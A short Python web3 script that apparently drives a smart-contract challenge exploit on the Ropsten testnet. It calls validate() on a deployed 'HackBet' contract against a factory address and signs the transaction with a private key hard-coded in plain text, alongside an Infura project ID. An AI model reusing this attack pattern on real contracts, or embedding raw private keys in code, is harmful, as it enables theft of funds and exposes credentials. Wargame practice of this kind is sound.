from web3 import Web3, HTTPProvider
import json

w3 = Web3(HTTPProvider('https://ropsten.infura.io/v3/15253aad1d464c0ea37c6a342fe0e1b3'))
account = w3.toChecksumAddress('0xf75ad09Aea6569e0d54Ccde65b655A598e9b66E4')
w3.eth.defaultAccount = account
privateKey = bytes.fromhex('40a8d082c7e38882d20e7bf174d3a9ea246c82073c7f7f061f4f6bb78bfdbf55')
factoryAddr = w3.toChecksumAddress('0x8e0a809B1f413deB6427535cC53383954DBF8329')
hackAddr = w3.toChecksumAddress('0x27d967Ff06498d2Ac8A0726A16863AD743d1447d')
hack = w3.eth.contract(address=hackAddr, abi=json.loads(open('./HackBet.abi').read()))

tx = hack.functions.validate(factoryAddr, 0xcaa003cb2c8feffc6716206682926a5cdeb73f7fa26d8f2f2fc0686d89d513d5).buildTransaction({
    'nonce': w3.eth.getTransactionCount(account),
    'gas': 300000,
    'gasPrice': w3.toWei(1000, 'Gwei')
})
signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))